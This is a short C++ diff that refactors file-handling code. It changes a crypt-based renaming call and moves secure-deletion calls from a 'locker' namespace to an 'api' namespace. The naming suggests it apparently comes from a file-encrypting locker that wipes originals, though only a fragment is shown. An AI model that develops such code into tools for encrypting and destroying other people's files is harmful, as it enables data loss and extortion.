@@ -134,7 +134,7 @@ char* filesystem::NameMethodState(PFILE_INFO fileinfo, PDRIVE_INFO data)
 		return swp_name;
 	}
 	
-	char* name = fileinfo->crypt_info->name_method(fileinfo, data->Filename, data->Exst, data->FullPath);
+	char* name = fileinfo->crypt_info->methods.name_method(fileinfo, data->Filename, data->Exst, data->FullPath);
 	if(name == NULL || memory::StrLen(name) > MAX_PATH)
 	{
 		LOG_ERROR("[NameMethodState] Failed; filename too long; " log_str, data->Filename);
@@ -173,12 +173,12 @@ void filesystem::delete_file_exst(PDRIVE_INFO data)
 	size_t lex = memory::StrLen(data->Exst);
 	if(lex < ECRYPT_NAME_LEN && GLOBAL_ENUM.g_CryptName == NAME::DELETE_NAME_)
 	{
-		locker::SecureDelete(data->FullPath);
+		api::SecureDelete(data->FullPath);
 		LOG_INFO("delete: %s", data->FullPath);
 	}
 	else if(lex == ECRYPT_NAME_LEN &&  GLOBAL_ENUM.g_CryptName == NAME::DELETE_NAME_L)
 	{
-		locker::SecureDelete(data->FullPath);
+		api::SecureDelete(data->FullPath);
 		LOG_INFO("delete: %s", data->FullPath);
 	}
 		
